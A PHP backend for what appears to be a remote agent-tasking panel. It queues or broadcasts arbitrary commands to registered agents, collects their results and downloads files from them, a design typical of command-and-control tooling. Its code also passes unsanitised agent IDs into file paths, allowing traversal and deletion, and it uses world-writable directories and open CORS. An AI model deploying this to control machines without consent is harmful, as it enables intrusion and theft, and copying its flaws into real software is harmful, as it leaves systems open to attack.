<?php
session_start();
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Allow UDP server internal calls (no session), block browser requests
    $is_cli = php_sapi_name() === 'cli';
    if (!$is_cli) {
        echo json_encode(['error' => 'Unauthorized']);
        http_response_code(401);
        exit;
    }
}
// udp_api.php - Complete version with secret key generation
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}



$action = $_GET['action'] ?? $_POST['action'] ?? '';

// Log the action for debugging

// Create agents directory if not exists
if (!file_exists('agents')) {
    mkdir('agents', 0777, true);
}

/**
 * Generate a secure random secret key
 */
function generate_secret_key() {
    return bin2hex(random_bytes(16)); // 32 character key
}

/**
 * Get agent online status
 */
function is_agent_online($last_seen) {
    if (!$last_seen) return false;
    $last_seen_time = strtotime($last_seen);
    return (time() - $last_seen_time) < 30; // Online if seen in last 30 seconds
}

switch($action) {
    
    // ===========================================
    // GENERATE NEW SECRET KEY
    // ===========================================
    case 'generate_key':
        $name = $_POST['name'] ?? $_GET['name'] ?? 'New Agent';
        
        // Generate unique secret key
        $secret_key = generate_secret_key();
        
        // Create agent directory using secret key as ID
        $agent_dir = "agents/$secret_key";
        
        if (!file_exists($agent_dir)) {
            mkdir($agent_dir, 0777, true);
            
            // Create config file
            $config = [
                'id' => $secret_key,
                'name' => $name,
                'secret_key' => $secret_key,
                'created' => date('Y-m-d H:i:s'),
                'last_seen' => null,
                'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
            ];
            
            file_put_contents("$agent_dir/config.json", json_encode($config, JSON_PRETTY_PRINT));
            
            // Create empty commands and results files
            file_put_contents("$agent_dir/commands.json", json_encode([]));
            file_put_contents("$agent_dir/results.json", json_encode([]));
            
           
        }
        
        echo json_encode([
            'success' => true,
            'secret_key' => $secret_key,
            'name' => $name,
            'message' => 'Agent created successfully'
        ]);
        break;
    
    // ===========================================
    // LIST ALL AGENTS
    // ===========================================
    case 'list_agents':
        $agents = [];
        $dirs = glob('agents/*', GLOB_ONLYDIR);
        
        // Get live connection status from relay
        $online_ids = [];
        $relay_url = "http://127.0.0.1:7332/?action=online_agents";
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $relay_resp = @file_get_contents($relay_url, false, $ctx);
        if ($relay_resp !== false) {
            $online_list = json_decode($relay_resp, true);
            if (is_array($online_list)) {
                foreach ($online_list as $a) {
                    $online_ids[$a['id']] = $a['ip'] ?? '';
                }
            }
        }
        
        foreach ($dirs as $dir) {
            $agent_id = basename($dir);
            $config_file = "$dir/config.json";
            
            if (file_exists($config_file)) {
                $config = json_decode(file_get_contents($config_file), true);
                
                // TCP connection = online, otherwise fall back to last_seen
                $online = isset($online_ids[$agent_id]);
                if (!$online) {
                    $online = is_agent_online($config['last_seen'] ?? null);
                }
                
                $agents[] = [
                    'id' => $agent_id,
                    'name' => $config['name'] ?? $agent_id,
                    'secret_key' => $config['secret_key'] ?? $agent_id,
                    'ip' => $online_ids[$agent_id] ?? $config['ip'] ?? 'unknown',
                    'last_seen' => $config['last_seen'] ?? null,
                    'online' => $online,
                    'created' => $config['created'] ?? 'unknown'
                ];
            }
        }
        
        usort($agents, function($a, $b) {
            if ($a['online'] != $b['online']) return $b['online'] - $a['online'];
            return strcmp($a['name'], $b['name']);
        });
        
        echo json_encode($agents);
        break;
    
    // ===========================================
    // GET SINGLE AGENT INFO
    // ===========================================
    case 'get_agent':
        $agent_id = $_GET['agent_id'] ?? '';
        
        if (!$agent_id) {
            echo json_encode(['error' => 'Agent ID required']);
            break;
        }
        
        $config_file = "agents/$agent_id/config.json";
        
        if (!file_exists($config_file)) {
            echo json_encode(['error' => 'Agent not found']);
            break;
        }
        
        $config = json_decode(file_get_contents($config_file), true);
        $online = is_agent_online($config['last_seen'] ?? null);
        
        $config['online'] = $online;
        
        echo json_encode($config);
        break;
    
    // ===========================================
    // SEND COMMAND TO AGENT
    // ===========================================
    case 'send_command':
        $agent_id = $_POST['agent_id'] ?? '';
        $command = $_POST['command'] ?? '';
        
        
        
        if (!$agent_id || !$command) {
            echo json_encode(['error' => 'Missing agent_id or command']);
            break;
        }
        
        // Check if agent directory exists
        $agent_dir = "agents/$agent_id";
        if (!file_exists($agent_dir)) {
            echo json_encode(['error' => 'Agent not found']);
            break;
        }
        
        // Save command to file
        $cmd_file = "$agent_dir/command.txt";
        
        // Write command with file lock
        $result = file_put_contents($cmd_file, $command, LOCK_EX);
        
        if ($result === false) {
            echo json_encode(['error' => 'Failed to write command file - check permissions']);
          
        } else {
            // Set proper permissions
            chmod($cmd_file, 0666);
            
            // Also append to commands.json for history
            $commands_file = "$agent_dir/commands.json";
            $commands = file_exists($commands_file) ? json_decode(file_get_contents($commands_file), true) : [];
            $commands[] = [
                'command' => $command,
                'timestamp' => date('Y-m-d H:i:s'),
                'status' => 'queued'
            ];
            file_put_contents($commands_file, json_encode($commands, JSON_PRETTY_PRINT));
            
            echo json_encode([
                'success' => true,
                'message' => 'Command queued successfully',
                'command' => $command
            ]);
            
            
        }
        break;
    
    // ===========================================
    // BROADCAST COMMAND TO ALL AGENTS
    // ===========================================
    case 'broadcast':
        $command = $_POST['command'] ?? '';
        
        if (!$command) {
            echo json_encode(['error' => 'No command specified']);
            break;
        }
        
        $agents = glob('agents/*', GLOB_ONLYDIR);
        $success_count = 0;
        $failed_agents = [];
        
        foreach ($agents as $agent_dir) {
            $cmd_file = "$agent_dir/command.txt";
            if (file_put_contents($cmd_file, $command, LOCK_EX)) {
                chmod($cmd_file, 0666);
                $success_count++;
            } else {
                $failed_agents[] = basename($agent_dir);
            }
        }
        
        echo json_encode([
            'success' => true,
            'message' => "Command broadcast to $success_count agents",
            'total_agents' => count($agents),
            'success_count' => $success_count,
            'failed_agents' => $failed_agents
        ]);
        break;
    
    // ===========================================
    // GET COMMAND RESULTS
    // ===========================================
    case 'get_results':
        $agent_id = $_GET['agent_id'] ?? '';
        $limit = intval($_GET['limit'] ?? 20);
        
        if (!$agent_id) {
            echo json_encode(['error' => 'Agent ID required']);
            break;
        }
        
        // Query relay in-memory results only — no disk fallback
        $relay_url = "http://127.0.0.1:7332/?action=get_results&agent_id=" . urlencode($agent_id);
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $relay_resp = @file_get_contents($relay_url, false, $ctx);
        
        if ($relay_resp !== false) {
            $results = json_decode($relay_resp, true);
            echo json_encode(is_array($results) ? array_slice($results, -$limit) : []);
        } else {
            echo json_encode([]);
        }
        break;
    
    // ===========================================
    // GET PENDING COMMANDS
    // ===========================================
    case 'get_pending':
        $agent_id = $_GET['agent_id'] ?? '';
        
        if (!$agent_id) {
            echo json_encode(['error' => 'Agent ID required']);
            break;
        }
        
        $commands_file = "agents/$agent_id/commands.json";
        
        if (file_exists($commands_file)) {
            $commands = json_decode(file_get_contents($commands_file), true);
            // Return pending commands only
            $pending = array_filter($commands, function($cmd) {
                return ($cmd['status'] ?? '') === 'queued';
            });
            echo json_encode(array_values($pending));
        } else {
            echo json_encode([]);
        }
        break;
    
    // ===========================================
    // DELETE AGENT
    // ===========================================
    case 'delete_agent':
        $agent_id = $_POST['agent_id'] ?? '';
        
        if (!$agent_id) {
            echo json_encode(['error' => 'Agent ID required']);
            break;
        }
        
        // Add to blacklist
        $bl_file = __DIR__ . '/blacklist.json';
        $bl = file_exists($bl_file) ? json_decode(file_get_contents($bl_file), true) : [];
        if (!is_array($bl)) $bl = [];
        if (!in_array($agent_id, $bl)) {
            $bl[] = $agent_id;
            file_put_contents($bl_file, json_encode($bl));
        }
        
        // Delete agent directory
        $agent_dir = "agents/$agent_id";
        if (file_exists($agent_dir)) {
            array_map('unlink', glob("$agent_dir/*"));
            rmdir($agent_dir);
        }
        
        echo json_encode(['success' => true, 'message' => 'Agent deleted and blacklisted']);
        break;
    
    // ===========================================
    // RENAME AGENT
    // ===========================================
    case 'rename_agent':
        $agent_id = $_POST['agent_id'] ?? '';
        $new_name = $_POST['name'] ?? '';
        
        if (!$agent_id || !$new_name) {
            echo json_encode(['error' => 'Agent ID and name required']);
            break;
        }
        
        $config_file = "agents/$agent_id/config.json";
        
        if (file_exists($config_file)) {
            $config = json_decode(file_get_contents($config_file), true);
            $config['name'] = $new_name;
            file_put_contents($config_file, json_encode($config, JSON_PRETTY_PRINT));
            echo json_encode(['success' => true, 'message' => 'Agent renamed']);
        } else {
            echo json_encode(['error' => 'Agent not found']);
        }
        break;
    
    // ===========================================
    // GET SYSTEM STATS
    // ===========================================
    case 'get_stats':
        $agents = glob('agents/*', GLOB_ONLYDIR);
        $total = count($agents);
        $online = 0;
        
        // Get live count from relay
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $relay_resp = @file_get_contents("http://127.0.0.1:7332/?action=status", false, $ctx);
        if ($relay_resp !== false) {
            $st = json_decode($relay_resp, true);
            $online = $st['agents'] ?? 0;
        }
        
        echo json_encode([
            'total_agents' => $total,
            'online_agents' => $online,
            'offline_agents' => $total - $online,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        break;
    
    // ===========================================
    // CLEAR RESULTS (unstick agent)
    // ===========================================
    case 'clear_results':
        $agent_id = $_GET['agent_id'] ?? $_POST['agent_id'] ?? '';
        if (!$agent_id) { echo json_encode(['error' => 'agent_id required']); break; }
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        @file_get_contents("http://127.0.0.1:7332/?action=clear_results&agent_id=" . urlencode($agent_id), false, $ctx);
        echo json_encode(['success' => true]);
        break;

    // ===========================================
    // FILE DOWNLOAD (via relay binary transfer)
    // ===========================================
    case 'start_download':
        $agent_id = $_GET['agent_id'] ?? '';
        $filepath = $_GET['path'] ?? '';
        if (!$agent_id || !$filepath) { echo json_encode(['error' => 'agent_id and path required']); break; }
        $ctx = stream_context_create(['http' => ['timeout' => 5]]);
        $relay_resp = @file_get_contents(
            "http://127.0.0.1:7332/?action=start_download&agent_id=" . urlencode($agent_id) . "&path=" . urlencode($filepath),
            false, $ctx
        );
        echo $relay_resp ?: json_encode(['error' => 'relay unavailable']);
        break;

    case 'download_status':
        $dl_id = $_GET['dl_id'] ?? '';
        if (!$dl_id) { echo json_encode(['error' => 'dl_id required']); break; }
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $relay_resp = @file_get_contents("http://127.0.0.1:7332/?action=download_status&dl_id=" . urlencode($dl_id), false, $ctx);
        echo $relay_resp ?: json_encode(['error' => 'relay unavailable']);
        break;

    case 'download_cleanup':
        $dl_id = $_GET['dl_id'] ?? '';
        if (!$dl_id) { echo json_encode(['error' => 'dl_id required']); break; }
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        @file_get_contents("http://127.0.0.1:7332/?action=download_cleanup&dl_id=" . urlencode($dl_id), false, $ctx);
        echo json_encode(['success' => true]);
        break;

    case 'download_file':
        $dl_id = $_GET['dl_id'] ?? '';
        $fname = $_GET['filename'] ?? 'download';
        if (!$dl_id || !preg_match('/^[a-f0-9]+$/', $dl_id)) { http_response_code(400); die('bad dl_id'); }
        $tmpfile = __DIR__ . '/downloads/' . $dl_id . '.tmp';
        if (!file_exists($tmpfile)) { http_response_code(404); die('not found'); }
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fname) . '"');
        header('Content-Length: ' . filesize($tmpfile));
        readfile($tmpfile);
        exit;
    
    // ===========================================
    // DEFAULT RESPONSE
    // ===========================================
    default:
        echo json_encode([
            'status' => 'ok',
            'message' => 'UDP Webhook API',
            'endpoints' => [
                'generate_key',
                'list_agents',
                'get_agent',
                'send_command',
                'broadcast',
                'get_results',
                'get_pending',
                'delete_agent',
                'rename_agent',
                'get_stats'
            ],
            'version' => '2.0'
        ]);
        break;
}
?>